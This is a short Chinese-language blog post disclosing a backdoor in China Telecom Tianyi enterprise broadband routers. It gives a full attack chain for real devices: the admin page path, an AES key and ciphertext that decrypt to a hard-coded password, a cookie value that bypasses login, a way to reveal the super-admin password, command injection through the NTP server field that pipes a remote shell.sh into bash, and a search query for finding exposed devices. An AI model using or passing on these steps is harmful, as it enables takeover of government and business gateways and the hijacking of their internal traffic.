---
title: China Telecom Tianyi Route Backdoor
date: 2016-07-04 23:37:24
tags: Backdoor
---

### 介绍
电信天意宽带政企平台是电信给政府和企业做的一款设备（外包给中兴做的），其包括VPN、用户上网行为管理等功能。覆盖全上海乃至南方数个城市数万企业与政府网关设备，通过这个后门可直接获取路由器超级管理员账号密码，并取得路由器系统root权限，进而劫持企业内部流量。

### 访问地址
> 后台地址图标为天翼宽带，地址如下：

```
http://ip:port/set/index.html
```
### 获取密码
```
key:
    123456789abcdef03456789abcdef01256789abcdef01234789abcdef0123456
Data:
    820ff917fff0407f6dc8d69e09c78723
```
[解密地址](http://extranet.cryptomathic.com/aescalc/index)
```
Output:
    636F6E66696700000000000000000000
hex decode:
    config      //password
```
### 添加Cookie字段值
```
bizstore_note=zte
```
### 获取超级管理员密码
编辑telecomadmin用户右击审查元素查看密码值

### 命令执行反弹shell
```
系统管理 >> 时间管理 >> NTP服务器1: `curl http://**.**.**.**/shell.sh | bash`

```

### Google search
```
intitle:管理平台登陆
```

